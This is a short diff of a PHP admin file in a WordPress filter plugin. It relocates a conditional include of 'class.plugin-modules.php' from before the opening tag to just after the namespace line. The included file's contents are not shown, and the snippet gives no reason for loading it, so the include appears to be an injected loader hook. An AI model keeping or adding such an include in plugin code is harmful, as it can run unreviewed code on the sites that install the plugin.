@@ -1,6 +1,7 @@
-<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
-
+<?php
 namespace FilterEverything\Filter\Pro\Admin;
+
+if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php');
 
 if ( ! defined('WPINC') ) {
     wp_die();
